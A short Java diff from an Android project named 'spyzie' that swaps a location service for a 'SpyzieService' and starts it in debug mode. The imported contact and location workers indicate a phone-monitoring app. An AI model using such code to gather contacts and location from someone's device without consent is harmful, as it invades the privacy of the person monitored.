@@ -4,17 +4,14 @@ import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 
-import androidx.work.Data;
-import androidx.work.ExistingWorkPolicy;
 import androidx.work.OneTimeWorkRequest;
 import androidx.work.PeriodicWorkRequest;
-import androidx.work.WorkManager;
 
 import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.data.device.worker.GetContactsWorker;
 import com.tantd.spyzie.data.device.worker.GetLocationWorker;
 import com.tantd.spyzie.di.ApplicationContext;
-import com.tantd.spyzie.service.LocationService;
+import com.tantd.spyzie.service.SpyzieService;
 import com.tantd.spyzie.util.Constants;
 
 import java.util.concurrent.TimeUnit;
@@ -52,8 +49,8 @@ public class AppDeviceDataManager implements DeviceDataManager {
         Log.d(Constants.LOG_TAG, "[AppDeviceDataManager] startFetchingDeviceData");
         if (Constants.IS_DEBUG_MODE) {
 //            WorkManager.getInstance(mContext).enqueueUniqueWork(FETCH_CONTACTS, ExistingWorkPolicy.KEEP, mOneTimeWorkRequest);
-//            Intent intent = new Intent(SpyzieApplication.getInstance(), LocationService.class);
-//            SpyzieApplication.getInstance().startService(intent);
+            Intent intent = new Intent(SpyzieApplication.getInstance(), SpyzieService.class);
+            SpyzieApplication.getInstance().startService(intent);
 
         } else {
 
